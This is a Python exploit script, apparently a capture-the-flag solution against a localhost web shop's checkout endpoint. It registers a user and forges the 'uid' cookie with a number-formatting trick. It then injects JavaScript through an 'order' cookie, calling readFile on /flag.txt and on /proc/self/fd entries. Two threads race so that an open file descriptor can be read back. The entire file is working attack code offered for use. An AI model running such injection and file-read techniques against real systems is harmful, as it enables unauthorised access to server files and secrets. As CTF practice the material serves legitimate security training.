from time import sleep

import requests
import threading
import uuid

base_url = 'http://localhost:8000/'

register_url = base_url + 'register'

username = str(uuid.uuid4())
username = username.replace('-', '')

register_data = {
    'username': username,
    'password': '12345678'
}

r = requests.post(url=register_url, json=register_data)

if r.json()['error']:
    print("Registration failed!")
    exit()

login_url = base_url + 'login'

login_data = register_data

r = requests.post(url=login_url, json=login_data)

if r.json()['error']:
    print("Login failed!")
    exit()

cookies = r.cookies.get_dict()
passwd = cookies['passwd']
uid = cookies['uid']


def e_formatter(n):
    a = '{:.4E}'.format(float(n))
    e = a.find('E')
    return '0.{}{}{}{:02d}'.format(a[0], a[2:e], a[e:e + 2], abs(int(a[e + 1:]) * 1 + 1))


uid = e_formatter(uid)

checkout_url = base_url + 'checkout'


def create_fd():
    order = 'a = _=> { return readFile`/flag.txt` + a`` }, a``'

    COOKIES = {
        'order': order,
        'passwd': passwd,
        'uid': uid
    }

    r = requests.get(url=checkout_url, cookies=COOKIES)


def read_flag(flag):
    order = ''
    for i in range(30):
        order += 'readFile`/proc/self/fd/{}`,'.format(i)
    order = order[:-1]

    COOKIES = {
        'order': order,
        'passwd': passwd,
        'uid': uid
    }

    r = requests.get(url=checkout_url, cookies=COOKIES)

    try:
        if r.json()['error']:
            print("Trying again!")
    except (TypeError, requests.exceptions.JSONDecodeError) as e:
        if "nland" in r.text:
            r = r.text.split('\\n')[1]
            flag[0] = r


flags = ['failed']
flag = ['failed']

while "nland" not in flag:
    t1 = threading.Thread(target=create_fd)
    t2 = threading.Thread(target=read_flag, args=(flags,))
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    flag = flags[0]
    sleep(1.0)

print(flag)
